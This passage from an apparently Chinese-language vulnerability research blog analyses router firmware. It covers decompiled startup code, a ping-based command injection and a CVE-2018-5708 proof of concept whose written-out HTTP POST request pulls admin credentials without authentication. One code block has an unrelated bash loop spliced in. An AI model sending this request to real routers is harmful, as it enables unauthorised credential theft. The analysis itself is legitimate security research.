class="hljs-regexp">/html_info.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/miniupnpd.conf.old</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp">-------------------- credentials --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libavahi-core.so.7.0.2</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/help.xml</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">##################################### lighttpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/lighttpd</span><br><span class="hljs-regexp">/tmp/log</span><span class="hljs-regexp">/lighttpd</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/lighttpd</span><br><span class="hljs-regexp">-------------------- cgi --------------------</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/sbin/my</span>_cgi.cgi<br></code></pre></td></tr></table></figure>
+
+<p>服务由lighttpd启动</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214057449.png" srcset="/img/loading.gif" lazyload alt="image-20240728214057449"></p>
+<p>关键性cgi：my_cgi.cgi</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214247010.png" srcset="/img/loading.gif" lazyload alt="image-20240728214247010"></p>
+<p>查找未授权访问页面</p>
+<p>用自己写的脚本enumUnauth 枚举后得到疑似未授权的weblist</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729113623698.png" srcset="/img/loading.gif" lazyload alt="image-20240729113623698"></p>
+<p>​		github地址：</p>
+<p>​		<a target="_blank" rel="noopener" href="https://github.com/GroundCTL2MajorTom/enumUnauth">https://github.com/GroundCTL2MajorTom/enumUnauth</a></p>
+<p>用浏览器插件bulk批量访问后得到一个未授权访问的页面<a target="_blank" rel="noopener" href="http://192.168.0.1/my_cgi.cgi?0.7543305713163453">http://192.168.0.1/my_cgi.cgi?0.7543305713163453</a></p>
+<img src="image-20240729114058448.png" srcset="/img/loading.gif" lazyload alt="image-20240729114058448" style="zoom:50%;" />
+
+<p>这里可以未授权查看系统信息</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728215127221.png" srcset="/img/loading.gif" lazyload alt="image-20240728215127221"></p>
+<p><strong>启动项分析</strong></p>
+<p>rcS 文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#!/bin/ash</span><br><br><span class="hljs-comment"># This script runs when init it run during the boot process.</span><br><span class="hljs-comment"># Mounts everything in the fstab</span><br>mount -a                   <span class="hljs-string">//</span> 挂载<span class="hljs-string">/etc/fstab</span>中列出的所有文件系统<br>mount -o remount +w /      <span class="hljs-string">//</span> 将根文件系统重新挂载为可写模式<br><br><span class="hljs-comment"># Mount the RAM filesystem to /tmp</span><br>mount -t tmpfs tmpfs <span class="hljs-string">/tmp</span>  <span class="hljs-string">//</span> 将内存文件系统挂载到<span class="hljs-string">/tmp</span>目录<br><br><span class="hljs-comment"># copy all files in the mnt folder to the etc folder</span><br>cp -a <span class="hljs-string">/mnt/</span>* <span class="hljs-string">/etc</span>           <span class="hljs-string">//</span> 复制<span class="hljs-string">/mnt</span>文件夹下的所有文件到<span class="hljs-string">/etc</span>文件夹<br><br><span class="hljs-comment"># Create necessary directories</span><br>mkdir -p <span class="hljs-string">/var/etc</span><br>mkdir -p <span class="hljs-string">/var/firm</span><br>mkdir -p <span class="hljs-string">/var/log</span><br>mkdir -p <span class="hljs-string">/var/misc</span><br>mkdir -p <span class="hljs-string">/var/run</span><br>mkdir -p <span class="hljs-string">/var/sbin</span><br>mkdir -p <span class="hljs-string">/var/tmp</span><br>mkdir -p <span class="hljs-string">/tmp/var</span><br><br><span class="hljs-comment"># Start system_manager and tftpd as background processes</span><br>system_manager &amp;           <span class="hljs-string">//</span> 启动system_manager后台进程<br>tftpd &amp;                    <span class="hljs-string">//</span> 启动tftpd后台进程<br></code></pre></td></tr></table></figure>
+
+<p>IDA二进制查看system_manager文件</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728215658086.png" srcset="/img/loading.gif" lazyload alt="image-20240728215658086"></p>
+<p>初始化系统</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> init_system()<br>&#123;<br>  load_entry();                   <span class="hljs-regexp">//</span> 载入程序入口（可能是某些配置或程序初始化）<br>  init_gpio();                    <span class="hljs-regexp">//</span> 初始化GPIO（通用输入输出）接口<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span>&quot;</span>);                <span class="hljs-regexp">//</span> 使用系统命令执行某个未知的操作，传入两个参数（字符串形式）<br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span>&quot;</span>);                <span class="hljs-regexp">//</span> 同上，执行另一个未知的操作，传入两个参数<br><br>  set_system_info();              <span class="hljs-regexp">//</span> 设置系统信息<br>  set_network_bridge();           <span class="hljs-regexp">//</span> 设置网络桥接<br><br>  set_host_name();                <span class="hljs-regexp">//</span> 设置主机名（设置设备或系统的主机名）<br><br>  <span class="hljs-keyword">sleep</span>(5u);                      <span class="hljs-regexp">//</span> 休眠<span class="hljs-number">5</span>秒，等待一些操作完成（<span class="hljs-string">`5u`</span>表示<span class="hljs-number">5</span>的无符号整数，单位为秒）<br><br>  byte_41393C = get_port_link_status(<span class="hljs-string">&quot;eth0&quot;</span>, <span class="hljs-number">4</span>);  <span class="hljs-regexp">//</span> 获取指定网络接口（eth0）的端口链接状态<br><br>  init_managers();                <span class="hljs-regexp">//</span> 初始化管理器<br><br>  init_web_server();              <span class="hljs-regexp">//</span> 初始化Web服务器（启动一个Web服务，提供Web接口）<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;switch_notifier &amp;&quot;</span>);    <span class="hljs-regexp">//</span> 启动一个名为 <span class="hljs-string">`switch_notifier`</span> 的后台进程<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;wan_led_control &amp;&quot;</span>);  <span class="hljs-regexp">//</span> 启动一个名为 <span class="hljs-string">`wan_led_control`</span> 的后台进程，并返回其执行结果<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>进入init_web_server函数</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> init_web_server()<br>&#123;<br>  init_html_files();    <span class="hljs-regexp">//</span> 初始化用于Web服务器所需的静态文件<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;sed -i &#x27;s/^#.*\&quot;mod_404redirect\&quot;/ \&quot;mod_404redirect\&quot;/g&#x27; /etc/lighttpd/modules.conf&quot;</span>);<br>  <span class="hljs-regexp">//</span> 使用系统命令调用 <span class="hljs-string">`sed`</span> 工具，用来修改 <span class="hljs-string">`/etc/lighttpd/modules.conf`</span> 文件，启用名为 <span class="hljs-string">`mod_404redirect`</span> 的模块<br><br>  update_lighttpd_user_conf();   <span class="hljs-regexp">//</span> 更新 lighttpd 的用户配置文件（假设这个函数更新了与用户相关的配置）<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;mkdir <span class="hljs-variable">%s</span>&quot;</span>);   <span class="hljs-regexp">//</span> 使用系统命令创建一个目录，但是代码中缺少目录名称参数，这可能导致问题<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;lighttpd -f <span class="hljs-variable">%s</span> &amp;&quot;</span>);<br>  <span class="hljs-regexp">//</span> 使用系统命令启动 lighttpd 服务器，<span class="hljs-string">`-f %s`</span> 是参数，用来指定 lighttpd 的配置文件路径<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>lighttpd就是这样起来的，在查看更新用户配置的函数update_lighttpd_user_conf()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">update_lighttpd_user_conf</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *v0;            <span class="hljs-comment">// 用于内存分配的指针</span><br>  <span class="hljs-type">int</span> i;               <span class="hljs-comment">// 循环计数器</span><br>  <span class="hljs-type">int</span> v2;              <span class="hljs-comment">// 用于存储计算的偏移量</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3;      <span class="hljs-comment">// 辅助字符串指针</span><br>  <span class="hljs-type">char</span> *v4;            <span class="hljs-comment">// 辅助字符串指针</span><br>  <span class="hljs-type">int</span> v5;              <span class="hljs-comment">// 比较结果</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v6;      <span class="hljs-comment">// 中间件对象数据指针</span><br>  FILE *result;        <span class="hljs-comment">// 返回的文件指针</span><br>  FILE *v8;            <span class="hljs-comment">// 文件指针</span><br>  <span class="hljs-type">void</span> *ptr[<span class="hljs-number">5</span>];        <span class="hljs-comment">// 中间件对象数组</span><br>  <span class="hljs-type">int</span> v10[<span class="hljs-number">5</span>];          <span class="hljs-comment">// 辅助整数数组</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">36</span>];        <span class="hljs-comment">// 存储 admin_user_name 的缓冲区</span><br>  <span class="hljs-type">char</span> v12[<span class="hljs-number">36</span>];        <span class="hljs-comment">// 存储 admin_user_pwd 的缓冲区</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">80</span>];        <span class="hljs-comment">// 存储最终写入文件的格式化字符串</span><br><br>  <span class="hljs-comment">// 初始化缓冲区</span><br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-number">0x21</span>u);  <span class="hljs-comment">// 清空 v11</span><br>  <span class="hljs-built_in">memset</span>(v12, <span class="hljs-number">0</span>, <span class="hljs-number">0x21</span>u);  <span class="hljs-comment">// 清空 v12</span><br><br>  <span class="hljs-comment">// 创建中间件对象</span><br>  create_midware_obj(ptr);  <span class="hljs-comment">// 初始化中间件对象，存储在 ptr[0] 中</span><br>  v0 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x5CBA0</span>u);    <span class="hljs-comment">// 分配约374 KB的内存并赋给 v0</span><br>  ptr[<span class="hljs-number">0</span>] = v0;              <span class="hljs-comment">// 将分配的内存地址存储在 ptr[0] 中</span><br><br>  <span class="hljs-comment">// 处理中间件对象中的数据</span><br>  <span class="hljs-keyword">if</span> (v0)<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(v10, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v10));  <span class="hljs-comment">// 清空辅助整数数组</span><br><br>    <span class="hljs-comment">// 查找 admin_user 的配置值</span><br>    <span class="hljs-keyword">if</span> (!((<span class="hljs-type">int</span> (__fastcall *)(<span class="hljs-type">int</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, _DWORD, <span class="hljs-type">void</span> *))ptr[<span class="hljs-number">1</span>])(v10, <span class="hljs-string">&quot;admin_user&quot;</span>, <span class="hljs-number">0</span>, v0))<br>    &#123;<br>      <span class="hljs-comment">// 循环处理中间件对象数据</span><br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;; ++i)<br>      &#123;<br>        v6 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)ptr[<span class="hljs-number">0</span>];  <span class="hljs-comment">// 获取中间件对象数据指针</span><br>        <span class="hljs-keyword">if</span> (i &gt;= *((_DWORD *)ptr[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>))  <span class="hljs-comment">// 判断是否超出数据项数量</span><br>          <span class="hljs-keyword">break</span>;<br><br>        v2 = <span class="hljs-number">633</span> * i;  <span class="hljs-comment">// 计算偏移量</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)ptr[<span class="hljs-number">0</span>] + <span class="hljs-number">633</span> * i + <span class="hljs-number">8</span>, <span class="hljs-string">&quot;admin_user_name&quot;</span>))  <span class="hljs-comment">// 检查是否为 admin_user_name</span><br>        &#123;<br>          v5 = <span class="hljs-built_in">strcmp</span>(&amp;v6[<span class="hljs-number">633</span> * i + <span class="hljs-number">8</span>], <span class="hljs-string">&quot;admin_user_pwd&quot;</span>);  <span class="hljs-comment">// 检查是否为 admin_user_pwd</span><br>          v4 = v12;  <span class="hljs-comment">// 设置辅助指针为 v12</span><br>          <span class="hljs-keyword">if</span> (v5)  <span class="hljs-comment">// 如果不是 admin_user_pwd，则继续下一个循环</span><br>            <span class="hljs-keyword">continue</span>;<br>          v3 = &amp;v6[v2 + <span class="hljs-number">40</span>];  <span class="hljs-comment">// 设置 v3 指向 admin_user_pwd 的值</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          v3 = &amp;v6[v2 + <span class="hljs-number">40</span>];  <span class="hljs-comment">// 设置 v3 指向 admin_user_pwd 的值</span><br>          v4 = v11;  <span class="hljs-comment">// 设置辅助指针为 v11</span><br>        &#125;<br>        <span class="hljs-built_in">strcpy</span>(v4, v3);  <span class="hljs-comment">// 复制值</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(ptr[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// 释放内存</span><br>  &#125;<br><br>  <span class="hljs-comment">// 打开或创建文件 /etc/lighttpd/lighttpd.user</span><br>  result = fopen(<span class="hljs-string">&quot;/etc/lighttpd/lighttpd.user&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>  v8 = result;<br>  <span class="hljs-keyword">if</span> (result)<br>  &#123;<br>    <span class="hljs-comment">// 格式化要写入的字符串</span><br>    <span class="hljs-built_in">memset</span>(v13, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v13));  <span class="hljs-comment">// 清空 v13</span><br>    <span class="hljs-built_in">sprintf</span>(v13, <span class="hljs-string">&quot;%s:%s&quot;</span>, v11, v12);  <span class="hljs-comment">// 格式化 admin_user_name:admin_user_pwd</span><br>    <span class="hljs-built_in">fputs</span>(v13, v8);  <span class="hljs-comment">// 将格式化字符串写入文件</span><br>    <span class="hljs-keyword">return</span> (FILE *)fclose(v8);  <span class="hljs-comment">// 关闭文件并返回结果</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;  <span class="hljs-comment">// 返回文件指针（或者 NULL 如果打开文件失败）</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>admin_user_name:admin_user_pwd就这样被写进去了</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="ping功能下的RCE"><a href="#ping功能下的RCE" class="headerlink" title="ping功能下的RCE"></a>ping功能下的RCE</h4><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141058443.png" srcset="/img/loading.gif" lazyload alt="image-20240729141058443"></p>
+<p>这里看到ping test就试一下命令执行，先抓包分析一下</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141140246.png" srcset="/img/loading.gif" lazyload alt="image-20240729141140246"></p>
+<p>抓包提交到了my_cgi.cgi</p>
+<p>ida打开my_cgi.cgi分析一下，定位到ping_test函数</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141248307.png" srcset="/img/loading.gif" lazyload alt="image-20240729141248307"></p>
+<p>可以看到sprintf函数把传进来的参数（ip地址）拼接成系统命令，并在下方的system函数执行</p>
+<p>开始尝试拼接执行系统命令</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729142151923.png" srcset="/img/loading.gif" lazyload alt="image-20240729142151923"></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729142226257.png" srcset="/img/loading.gif" lazyload alt="image-20240729142226257"></p>
+<p>成功写入</p>
+<h4 id="CVE-2018-5708-信息泄露"><a href="#CVE-2018-5708-信息泄露" class="headerlink" title="CVE-2018-5708 信息泄露"></a><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-5708">CVE-2018-5708</a> 信息泄露</h4><p>POC</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728164709522.png" srcset="/img/loading.gif" lazyload alt="image-20240728164709522"></p>
+<p>在发往my_cgi.cgi的数据包中结合加入<code>request=load_settings&amp;table_name=admin_user</code>即可返回XML格式的用户名密码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">login_level</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">login_level</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin_user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">admin_user_name</span>&gt;</span><br>        	  admin<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">admin_user_name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">admin_user_pwd</span>&gt;</span><br>        	 123456<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">admin_user_pwd</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">admin_level</span>&gt;</span><br>        	  1<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">admin_level</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin_user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看出是参数admin_user把整个table都读出来了</p>
+<p>由于发往my_cgi.cgi的数据包是在登录页面login_real.htm中抓到的</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728170547941.png" srcset="/img/loading.gif" lazyload alt="image-20240728170547941"></p>
+<p>分析login_real.htm代码</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728170620082.png" srcset="/img/loading.gif" lazyload alt="image-20240728170620082"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/my_cgi.cgi?0.42868205431214634</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">78</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">127.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">127.0.0.0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: */*</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.0.1</span>/login_real.htm</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">request</span>=no_auth&amp;request=load_settings&amp;table_name=no_auth&amp;table_name=admin_user</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>那么在后台参数又是如何传递的呢？</p>
+<p>打开IDA</p>
+<p>找到load_settings函数</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728190750323.png" srcset="/img/loading.gif" lazyload alt="image-20240728190750323"></p>
+<p>可以看到先检查了有没有no_auth参数</p>
+<p>然后一步一步查看table_name是否匹配</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728190934765.png" srcset="/img/loading.gif" lazyload alt="image-20240728190934765"></p>
+<p>走到这里的时候，假设table_name&#x3D;admin_user 一直没有匹配的情况下，执行了这条。感觉IDA不是很准，打开Ghidra</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728191139422.png" srcset="/img/loading.gif" lazyload alt="image-20240728191139422"></p>
+<p>分析该代码</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">iVar1 = <span class="hljs-comment">(*(code *)</span>param_1[<span class="hljs-number">1</span>])<br>(&amp;reading_file,iVar4,<span class="hljs-number">0</span>,*param_1)<span class="hljs-punctuation">;</span><br><span class="hljs-comment">//这行代码的作用是调用一个通过 param_1[1] 指针指向的函数，并将其返回值赋给 iVar1。具体函数的功能和返回类型需要根据 param_1 的定义和对应函数的实现来确定。</span><br>#!/bin/bash<br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">true</span><br><span class="hljs-keyword">do</span><br>    clear <br>    ps aux<br>    sleep <span class="hljs-number">1</span><br>done<br></code></pre></td></tr></table></figure>
+
+<p>这里应该是调用param_1[1] 指针指向的函数，执行readingfile操作，找的是那个文件呢？</p>
+<p>在文件结构中搜索admin_user_pwd</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728203715351.png" srcset="/img/loading.gif" lazyload alt="image-20240728203715351"></p>
+<p>默认的用户名密码被存在nvram_default中</p>
+<p>FirmAE进shell查找未果</p>
+<img src="image-20240728204044172.png" srcset="/img/loading.gif" lazyload alt="image-20240728204044172" style="zoom:50%;" />
+
+<p>这里启动时应该是调用了nvram把密码写入到了内存，eeprom里面</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">NVRAM（Non-<span class="hljs-keyword">Volatile</span> Random-<span class="hljs-keyword">Access</span> Memory，非易失性随机存取存储器）是一种存储设备，能够在电源断电的情况下保持数据。与传统的 RAM（随机存取存储器）不同，RAM 是易失性的，即在断电时数据会丢失。NVRAM 通过不同的技术可以在断电后保持数据，例如：<br><br>闪存（Flash Memory）：一种常见的 NVRAM 类型，广泛用于存储数据，如固态硬盘（SSD）和 USB 闪存驱动器。<br><br>EEPROM（Electrically Erasable Programmable <span class="hljs-keyword">Read</span>-<span class="hljs-keyword">Only</span> Memory）：允许电气擦除和重新编程的只读存储器，常用于存储固件或配置数据。<br><br>FRAM（Ferroelectric RAM）：使用铁电材料来实现数据存储，具有快速写入和高耐久性的特点。<br><br>PROM（Programmable <span class="hljs-keyword">Read</span>-<span class="hljs-keyword">Only</span> Memory） 和 EPROM（Erasable Programmable <span class="hljs-keyword">Read</span>-<span class="hljs-keyword">Only</span> Memory）：早期的非易失性存储技术，现已被闪存和 EEPROM 替代。<br><br>NVRAM 的主要用途包括：<br><br>存储固件：嵌入式系统和计算机中的固件常常存储在 NVRAM 中，以确保在重新启动后仍能使用。<br>保存配置设置：例如路由器、交换机等网络设备中的配置数据通常存储在 NVRAM 中。<br>设备状态：一些设备可能将状态信息存储在 NVRAM 中，以便在重新启动后能够恢复到先前的状态。<br>NVRAM 的主要优点是它能够在断电情况下保留数据，适合需要持久保存配置信息或系统状态的应用。<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214835092.png" srcset="/img/loading.gif" lazyload alt="image-20240728214835092"></p>
